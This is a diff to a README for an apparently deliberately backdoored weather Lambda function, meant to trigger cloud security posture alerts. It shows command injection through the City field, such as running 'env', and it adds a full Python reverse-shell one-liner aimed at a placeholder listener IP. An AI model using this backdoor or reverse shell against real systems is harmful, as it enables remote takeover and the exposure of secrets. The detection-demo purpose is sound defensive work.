@@ -134,7 +134,7 @@ API Key: Input your Api Key or use this: ```d006ed318b33fd0baad3aec15369b3ab```
 Here is what it looks like:
 
 ```
-.\profile.py
+λ .\profile.py
 Weather App - Lambda Function
 Target: <insert-api-gateway-here>
 City: Kelowna
@@ -150,7 +150,7 @@ Keep an eye on the serverless asset in CSPM and you will see the behavioral fini
 To use the function in a non-malicous way, navigate to the scripts directory and run activity.py. Here is an example of normal operation:
 
 ```
-./activity.py
+λ .\activity.py
 Weather App - Lambda Function
 Target: <insert-api-gateway-here>
 City: Kelowna
@@ -167,9 +167,9 @@ To exploit the backdoor, enter the command you'd like to run in the ```City``` f
 In this example, the attacker is running  ```env``` against the function. 
 
 ```
-activity.py
+λ .\activity.py
 Weather App - Lambda Function
-Target: https://c9wsie1015.execute-api.us-east-1.amazonaws.com/dev/main.lambda_handler
+Target: <insert-api-gateway-here>
 City: env
 API Key: backdoor
 ""
@@ -183,6 +183,16 @@ For a more malicious script, you can try to run a reverse shell.<br>
 
 Here is the command to insert:
 ```python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ENTER_YOUR_LISTENING_IP_HERE",<ENTER_PORT_TO_SEND_SHELL));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'```
+
+It will look like this in the command:
+```
+λ .\activity.py
+Weather App - Lambda Function
+Target: <insert-api-gateway-here>
+City: python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<ENTER_YOUR_LISTENING_IP_HERE",<ENTER_PORT_TO_SEND_SHELL));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")'
+API Key: backdoor
+""
+```
 
 Here is the corresponding alert:
 
